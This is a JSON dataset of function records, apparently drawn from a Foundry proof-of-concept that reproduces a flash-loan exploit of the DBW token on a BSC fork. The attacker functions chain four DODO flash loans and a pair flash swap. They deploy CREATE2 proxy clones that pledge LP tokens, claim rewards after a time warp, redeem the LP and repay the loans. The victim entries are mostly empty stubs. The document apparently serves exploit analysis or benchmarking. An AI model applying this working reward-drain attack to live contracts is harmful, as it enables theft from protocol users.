[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == dodo1) {\n            dodo2FlashLoanAmount = USDT.balanceOf(dodo2);\n            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo1, dodo1FlashLoanAmount);\n        } else if (msg.sender == dodo2) {\n            dodo3FlashLoanAmount = USDT.balanceOf(dodo3);\n            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo2, dodo2FlashLoanAmount);\n        } else if (msg.sender == dodo3) {\n            dodo4FlashLoanAmount = USDT.balanceOf(dodo4);\n            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo3, dodo3FlashLoanAmount);\n        } else if (msg.sender == dodo4) {\n            PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;\n            flashSwapPair.swap(PairFlashLoanAmount, 0, address(this), new bytes(1));\n            USDT.transfer(dodo4, dodo4FlashLoanAmount);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getAddress",
    "original_code": "    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        return address(uint160(uint256(hash)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "getCreationBytecode",
    "original_code": "    function getCreationBytecode(\n        address claimImpl\n    ) public pure returns (bytes memory) {\n        bytes memory bytecode = type(miniProxy).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(claimImpl));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "hook",
    "original_code": "    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        USDT.approve(address(Router), type(uint256).max);\n        DBW.approve(address(Router), type(uint256).max);\n        Pair.approve(address(Router), type(uint256).max);\n        USDTToDBW_AddLiquidity();\n        miniProxyCloneFactory(address(RewardImpl));\n        RemoveLiquidity_DBWToUSDT();\n        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_745_691);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(DBW), \"DBW\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(dodo1), \"dodo1\");\n        cheats.label(address(dodo2), \"dodo2\");\n        cheats.label(address(dodo3), \"dodo3\");\n        cheats.label(address(dodo4), \"dodo4\");\n        cheats.label(address(flashSwapPair), \"flashSwapPair\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        RewardImpl = new claimRewardImpl();\n        dodo1FlashLoanAmount = USDT.balanceOf(dodo1);\n        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "claimRewardImpl",
    "source_type": "attacker_contract",
    "function_name": "exploit",
    "original_code": "    function exploit() public {\n        IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);\n        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);\n        Pair.approve(address(DBW), type(uint256).max);\n        DBW.getStaticIncome();\n        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit\n        uint256 LPAmount = Pair.balanceOf(address(this));\n        DBW.pledge_lp(LPAmount); // send LP\n        DBW.getStaticIncome(); // claim reward\n        DBW.redemption_lp(LPAmount); // redeem LP\n        Pair.transfer(msg.sender, LPAmount);\n        DBW.transfer(address(Pair), DBW.balanceOf(address(this)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "getStaticIncome",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "pledge_lp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "redemption_lp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint amount) external returns (bool) {\n        _transferTokens(msg.sender, dst, amount);\n        return true;\n    }\n\n    function transferFrom(address src, address dst, uint amount) external returns (bool) {\n        address spender = msg.sender;\n        uint spenderAllowance = allowance[src][spender];\n\n        if (spender != src && spenderAllowance != type(uint).max) {\n            uint newAllowance = spenderAllowance - amount;\n            allowance[src][spender] = newAllowance;\n\n            emit Approval(src, spender, newAllowance);\n        }\n\n        _transferTokens(src, dst, amount);\n        return true;\n    }\n\n    function _transferTokens(address src, address dst, uint amount) internal {\n        _updateFor(src); // update fee position for src\n        _updateFor(dst); // update fee position for dst\n\n        balanceOf[src] -= amount;\n        balanceOf[dst] += amount;\n\n        emit Transfer(src, dst, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n}\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDBW",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]